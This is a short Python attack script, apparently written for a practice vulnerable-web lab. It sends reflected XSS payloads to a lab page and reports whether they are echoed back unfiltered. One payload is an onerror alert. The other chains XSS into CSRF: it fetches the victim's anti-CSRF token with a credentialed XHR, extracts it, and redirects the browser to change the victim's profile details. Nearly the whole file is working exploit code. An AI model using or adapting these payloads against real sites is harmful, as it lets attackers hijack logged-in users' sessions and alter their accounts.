import requests
from urllib.parse import urlencode

base_url = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/xss/xss_reflected_get.php"

payload_list = [
    '<IMG SRC=x OnError=alert(1)>',
    # 最终版，XHR拿token + location.href GET跳转修改
    '<script>var xhr=new XMLHttpRequest();xhr.open("GET","https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/csrf/csrftoken/token_get_edit.php");xhr.withCredentials=true;xhr.onload=function(){var token = xhr.responseText.match(/name="token" value="([0-9a-zA-Z]+)"/)[1];location.href = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/csrf/csrftoken/token_get_edit.php?sex=girl&phonenum=13800000000&add=hacked&email=hack@test.com&token="+token+"&submit=";};xhr.send();</script>'
]

for pay in payload_list:
    params = {
        "message": pay,
        "submit": "submit"
    }
    full_attack_url = f"{base_url}?{urlencode(params)}"
    print("-"*80)
    print(f"🔗攻击URL（浏览器直接打开，已登录靶场）:\n{full_attack_url}\n")
    res = requests.get(base_url, params=params, timeout=10)
    if pay in res.text:
        print("✅payload回显成功，未被过滤")
    else:
        print("❌payload被过滤")
